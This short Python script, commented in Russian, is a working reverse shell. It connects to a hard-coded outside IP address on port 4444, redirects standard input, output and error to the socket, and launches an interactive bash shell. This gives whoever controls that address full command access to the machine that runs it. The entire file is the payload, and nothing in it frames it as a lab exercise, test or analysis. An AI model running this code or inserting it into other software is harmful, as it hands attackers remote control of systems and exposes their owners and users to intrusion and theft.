import socket
import subprocess
import os

# Настройки подключения
HOST = '94.159.110.21'  # IP-адрес для обратного подключения
PORT = 4444              # Порт для подключения

# Создаем сокет
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Подключаемся к удаленному хосту
s.connect((HOST, PORT))

# Перенаправление стандартного ввода, вывода и ошибок
os.dup2(s.fileno(), 0)  # стандартный ввод
os.dup2(s.fileno(), 1)  # стандартный вывод
os.dup2(s.fileno(), 2)  # стандартный вывод ошибок

# Запускаем оболочку
p = subprocess.call(["/bin/bash", "-i"])
